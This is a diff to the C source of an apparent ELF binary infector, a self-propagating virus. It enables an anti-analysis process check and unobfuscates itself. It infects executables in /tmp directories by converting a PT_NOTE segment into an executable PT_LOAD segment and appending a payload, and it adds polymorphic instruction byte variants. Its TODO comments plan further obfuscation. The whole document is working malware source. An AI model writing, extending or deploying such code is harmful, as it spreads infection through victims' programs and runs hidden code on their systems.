@@ -1,31 +1,29 @@
 // TODO Compile every libc functions in a static lib
 // TODO Obfuscate code again when finished
-static void  start(void) {}
-
 #include "shellcode.h"
 
-/* asm("pushfq"); */
+static void  start(void) {}
+asm("pushfq");
 int   entry_point(void *magic) {
   int     ret;
   char    infectDir[] = "/tmp/test";
   char    infectDir2[] = "/tmp/test2";
   char    procName[] = "/proc/";
 
-  /* if (checkProcess(procName) != 0) */
-  /*   return (stop(1, magic)); */
+  if (checkProcess(procName) != 0)
+    return (stop(1, magic));
   /* if ((ret = preventDebug()) == -1) */
   /*   return (stop(1, magic)); */
-  /* if (ret == 1) */
-  /*   return (stop(0, magic)); */
+  if (ret == 1)
+    return (stop(0, magic));
   if (magic != (void *)0x42)
     if (unObfuscate() == -1)
       return (stop(1, magic));
-  if (infectBins(infectDir) == -1)
-    return (stop(1, magic));
-  /* if (infectBins(infectDir2) == -1) */
-    /* exit(1); */
+      /* exit(1); */
+  infectBins(infectDir);
+  infectBins(infectDir2);
   return (stop(0, magic));
-  exit(0);
+  /* exit(0); */
 }
 
 static int   stop(int status, void *magic) {
@@ -33,7 +31,7 @@ static int   stop(int status, void *magic) {
     return (status);
   asm("leave\n\t"
       "leave\n\t"
-      /* "popfq\n\t" */
+      "popfq\n\t"
       "mov $0, %rbx\n\t"
       "mov $0, %rcx\n\t"
       "mov $0, %rdx\n\t"
@@ -495,7 +493,7 @@ static int  mapFile(const char *dirname, const char *filename, struct bfile *bin
   }
   if ((fd = open(tmp, O_RDWR, 0)) < 0) {
     munmap(tmp, len);
-    return (-1);
+    return (1);
   }
   munmap(tmp, len);
   if ((tmp = mmap(0, stats.st_size, PROT_READ, MAP_PRIVATE, fd, 0)) < 0) {
@@ -610,6 +608,9 @@ const char  instructions[][MAX_INS_SIZE] __attribute__ ((section (".text#"))) = 
   "\x48\x31\xf6\x90\x90\x90\x90\x42", // xor rsi ,rsi
   "\x90\x90\x48\x31\xf6\x90\x90\x42", // xor rsi ,rsi
   "\x42",
+  "\xbf\x01\x00\x00\x00\x42", // mov edi, 0x1
+  "\x31\xff\x40\xb7\x01\x42", // xor edi, edi\n\t mov dil, 0x1
+  "\x42",
 };
 
 static int  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
@@ -704,7 +705,7 @@ static int  appendCode(struct bfile *bin) {
 segment != ((void *)bin->header) + bin->header->e_phoff + bin->header->e_phnum * sizeof(Elf64_Phdr))
     segment += 1;
   if (segment->p_type != PT_NOTE)
-    return (-1);
+    return (1);
   segment->p_flags = PF_R | PF_X;
   segment->p_type = PT_LOAD;
   segment->p_offset = bin->size - size;
@@ -718,12 +719,14 @@ segment != ((void *)bin->header) + bin->header->e_phoff + bin->header->e_phnum *
 }
 
 static int  infectFile(struct bfile bin) {
-  char payload[] = PAYLOAD;
+  int   ret;
+  char  payload[] = PAYLOAD;
 
   appendSignature(bin);
-  if (appendCode(&bin) == -1) {
+  if ((ret = appendCode(&bin)) != 0) {
     munmap(bin.header, bin.size);
-    return (-1);
+    close(bin.fd);
+    return (ret);
   }
   write(bin.fd, bin.header, bin.size);
   close(bin.fd);
